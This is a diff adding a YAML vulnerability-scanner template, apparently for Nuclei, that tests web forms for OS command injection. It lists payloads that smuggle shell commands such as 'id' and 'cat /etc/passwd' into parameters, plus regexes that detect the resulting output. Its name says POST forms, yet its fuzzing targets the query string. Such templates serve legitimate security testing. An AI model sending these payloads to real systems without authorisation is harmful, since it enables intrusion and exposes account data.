@@ -1,0 +1,61 @@
+id: cmdi-post-form
+
+info:
+  name: OS Command Injection - POST Form Parameters
+  author: erebos
+  severity: critical
+  description: |
+    Tests for OS command injection in POST form parameters by injecting
+    shell metacharacters and observing command output in responses.
+    Targets applications that pass user input to system commands.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+  metadata:
+    max-request: 6
+  tags: cmdi,injection,dast,post,vuln
+  classification:
+    cwe-id: CWE-78
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+
+    payloads:
+      cmdi:
+        - ";id"
+        - "|id"
+        - "$(id)"
+        - "`id`"
+        - "127.0.0.1;id"
+        - "127.0.0.1|cat /etc/passwd"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{cmdi}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+\\([a-z]+\\)"
+          - "root:.*:0:0:"
+          - "www-data:.*:"
+          - "daemon:.*:"
+        condition: or
+
+      - type: word
+        part: body
+        words:
+          - "uid=0(root)"
+          - "uid=33(www-data)"
+          - "uid=1000"
+        condition: or
